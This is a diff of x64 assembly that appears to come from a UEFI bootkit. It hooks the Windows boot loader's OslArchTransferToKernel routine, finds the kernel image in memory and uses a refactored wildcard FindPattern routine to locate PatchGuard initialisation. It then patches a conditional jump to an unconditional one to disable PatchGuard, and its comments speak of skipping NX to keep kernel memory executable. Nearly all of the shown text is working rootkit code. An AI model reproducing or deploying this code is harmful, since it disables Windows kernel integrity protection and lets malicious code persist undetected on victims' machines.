@@ -81,20 +81,6 @@ PrintStringTest PROC
 	ret
 PrintStringTest ENDP
 
-
-;	; Search image base
-;	and rdx, 0FFFFFFFFFFFFF000h
-;get_imagebase:
-;	cmp word ptr [rdx], 05A4Dh
-;	je get_imagesize
-;	sub rdx, 01000h
-;	jmp get_imagebase
-;
-;	; Search for NX flag pattern in image
-;get_imagesize:
-;	mov ecx, dword ptr[rdx+03Ch]			; get e_lfanew from DOS headers
-;	mov ebx, dword ptr[rdx+rcx+050h]		; get sizeOfImage from OptionialHeader in PE
-
 ;
 ; Our OslArchTransferToKernelHook hook
 ;
@@ -142,7 +128,7 @@ get_imagebase:
 	jmp get_imagebase
 get_imagesize:
 	mov ecx, dword ptr [rdx + 3Ch]	; get e_lfanew from DOS header
-	mov ebx, dword ptr [rdx + rcx + 50h]	; get SizeOfImage from OptionialHeader in PE
+	mov ebx, dword ptr [rdx + rcx + 50h] ; get SizeOfImage from OptionialHeader in PE
 
 	; Skip setting the NX bit for when we want to set executable memory in kernel
 ;skip_nx_bit:
@@ -158,20 +144,19 @@ get_imagesize:
 
 	; Get rid of patchguard
 fuck_you_patchguard:
-	lea rcx, sigInitPatchGuard
-	sub rbx, sigInitPatchGuardSize
-	push rdx
-	mov rax, rdx
-	mov rdx, sigInitPatchGuardSize
-	call find_pattern
+	push rdx ; rdx is the image base, back it up on the stack
+	mov rcx, rdx ; image base now in rcx
+	mov rdx, rbx ; image size stored in rdx
+	lea r8, sigInitPatchGuard ; pattern stored in r8
+	mov r9, sigInitPatchGuardSize ; pattern size stored in r9
+	call FindPattern
+	pop rdx ; restore image base
 	cmp rax, 0
 	je OslArchTransferToKernelHook_exit
 	mov byte ptr[rax], 0EBh ; Patch 'jz short' to 'jmp short'
 
-	; Exit hook, restore registers, and jump to the original function
+	; Exit hook - restore registers, and jump to the original function
 OslArchTransferToKernelHook_exit:
-	pop rdx
-restore_regs:
 	mov rsp, rbp
 	popfq
 	pop rax
@@ -196,42 +181,57 @@ restore_regs:
 OslArchTransferToKernelHook ENDP
 
 ;*********************************************************************
-; Find a pattern
-; RAX = base_ptr
-; RBX = base_size
-; RCX = pattern_ptr
-; RDX = pattern_size
+; Find a pattern (Wildcard is 0xCC)
+;
+; UINT64 FindPattern(VOID* ImageBase, UINT32 ImageSize, UINT8* Pattern, UINT32 PatternSize);
+;
+; RCX = ImageBase
+; RDX = ImageSize
+; R8  = Pattern
+; R9  = PatternSize
+;
+; Returns address that pattern is found or NULL if not found
+; 
 ;*********************************************************************
-find_pattern:
-	push rcx 
-	push r8
-	push r9
-	xor r8,r8 
-	xor r9,r9
-pattern_search_loop:
-	cmp r9,rbx
-	jae pattern_search_exit_error
+FindPattern PROC
+ 
+pattern_search_begin:
 	push rcx
-	mov cl, byte ptr [rcx + r8]
-	cmp cl, byte ptr [rax + r8]
-	pop rcx
+	push rdi ; backup som regs
+	push rsi
+	push r10
+	xor rdi, rdi ; zero out some regs
+	xor rsi, rsi
+	xor r10, r10
+	sub rdx, r9 ; sub pattern size from image size
+pattern_search_loop: ; main loop
+	cmp rsi, rdx ; check if at end of the image
+	jae pattern_search_not_found
+	mov r10b, byte ptr [r8 + rdi]
+	cmp r10b, byte ptr [rcx + rdi]
+	je pattern_search_matched
+	cmp r10b, 0CCh ; check wildcard
 	jne pattern_search_continue
-	inc r8
-	cmp r8,rdx
+pattern_search_matched:
+	inc rdi
+	cmp rdi, r9
 	jae pattern_search_exit
 	jmp pattern_search_loop
 pattern_search_continue:
-	xor r8,r8
-	inc rax
-	inc r9
+	xor rdi, rdi
+	inc rcx
+	inc rsi
 	jmp pattern_search_loop
-pattern_search_exit_error:
-	xor rax,rax
-	jmp pattern_search_exit
+pattern_search_not_found:
+	xor rcx, rcx ; return NULL
 pattern_search_exit:
-	pop r9
-	pop r8
+	mov rax, rcx ; return value that pattern was found at
+	pop r10
+	pop rsi
+	pop rdi
 	pop rcx
 	ret
+ 
+FindPattern ENDP
 
 END
